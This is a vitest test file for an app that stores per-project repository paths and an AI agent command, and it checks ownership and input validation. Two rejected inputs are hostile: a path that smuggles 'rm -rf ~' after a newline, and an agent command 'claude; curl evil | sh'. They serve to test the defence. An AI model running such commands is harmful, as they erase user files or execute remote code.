// Projects' repository paths (contracts/analyze.ts): the user's own projects only,
// paths that can only be one shell word, and "Analyse" refused while a project has none.
import { beforeAll, describe, expect, it } from "vitest";

process.env.DATABASE_URL = ":memory:";

const q: typeof import("../queries/connection").q = async (text, ...params) => (await import("../queries/connection")).q(text, ...params);

async function makeUser(name: string) {
  const [{ id: userId }] = await q<{ id: number }>("INSERT INTO users (username, display_name, created_at) VALUES (?, ?, 1) RETURNING id", name, name);
  const [{ id: connId }] = await q<{ id: number }>(
    "INSERT INTO connections (user_id, type, base_url, remote_account_id, options, encrypted_secret, created_at) VALUES (?, 'jira', 'https://jira.example', 'me', '{}', 'x', 1) RETURNING id",
    userId,
  );
  const [{ id: containerId }] = await q<{ id: number }>("INSERT INTO containers (connection_id, remote_id, key, name, created_at) VALUES (?, '1', 'APP', 'App', 1) RETURNING id", connId);
  await q(
    "INSERT INTO issues (user_id, connection_id, container_id, jira_id, key, summary, status, project_key, project_name, url, synced_at) VALUES (?, ?, ?, 'i1', 'APP-1', 'One', 'To Do', 'APP', 'App', 'u', 1)",
    userId, connId, containerId,
  );
  const { appRouter } = await import("../router");
  const { getDb } = await import("../queries/connection");
  const { users } = await import("@db/schema");
  const { eq } = await import("drizzle-orm");
  const [user] = await getDb().select().from(users).where(eq(users.id, userId));
  return { containerId, connId, caller: appRouter.createCaller({ req: new Request("http://localhost/"), resHeaders: new Headers(), user, sessionId: null }) };
}

describe("project repository paths", () => {
  beforeAll(async () => {
    await (await import("../queries/connection")).resetDbForTests();
  });

  it("a project's paths are saved in order, once each, and listed with it", async () => {
    const u = await makeUser("p1");
    const saved = await u.caller.projectPaths.save({
      containerId: u.containerId,
      paths: [
        { label: "app", path: "~/code/app" },
        { label: "server", path: "/srv/My Server" },
        { label: "again", path: "~/code/app" },
      ],
    });
    expect(saved).toEqual([
      { label: "app", path: "~/code/app" },
      { label: "server", path: "/srv/My Server" },
    ]);
    const list = await u.caller.projectPaths.list();
    expect(list.find(p => p.id === u.containerId)?.paths).toHaveLength(2);
    await u.caller.projectPaths.save({ containerId: u.containerId, paths: [] });
    expect((await u.caller.projectPaths.list())[0].paths).toEqual([]);
  });

  it("refuses paths that aren't one plain line, and other people's projects", async () => {
    const u = await makeUser("p2");
    for (const path of ["relative/app", "/ok\n/rm -rf ~", "C:\\code"]) {
      await expect(u.caller.projectPaths.save({ containerId: u.containerId, paths: [{ label: "x", path }] })).rejects.toThrow();
    }
    const other = await makeUser("p3");
    await expect(other.caller.projectPaths.save({ containerId: u.containerId, paths: [{ label: "x", path: "/x" }] })).rejects.toMatchObject({ code: "NOT_FOUND" });
    expect((await other.caller.projectPaths.list()).some(p => p.id === u.containerId)).toBe(false);
  });

  it("the agent command is a program and options only", async () => {
    const u = await makeUser("p4");
    await u.caller.settings.update({ agentCommand: "claude --model opus" });
    expect((await u.caller.settings.get()).agentCommand).toBe("claude --model opus");
    await expect(u.caller.settings.update({ agentCommand: "claude; curl evil | sh" })).rejects.toThrow();
  });

  it("Analyse needs the project's repositories first", async () => {
    const u = await makeUser("p5");
    await expect(u.caller.issues.analyzeCommand({ key: "APP-1" })).rejects.toMatchObject({ code: "PRECONDITION_FAILED" });
  });
});
